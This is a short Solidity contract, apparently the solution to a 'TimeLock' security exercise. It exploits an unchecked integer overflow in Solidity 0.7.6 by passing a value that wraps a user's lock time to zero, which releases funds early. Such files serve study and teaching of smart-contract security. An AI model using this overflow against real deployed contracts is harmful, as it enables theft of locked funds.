//SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {N3TimeLock} from "../N3-TimeLock-easy.sol";

contract N3TimeLockHack {
  function hack(address user, N3TimeLock _timelock) external {
    N3TimeLock timelock = N3TimeLock(_timelock);
    timelock.increaseLockTime(type(uint256).max + 1 - timelock.lockTime(user));
  }
}
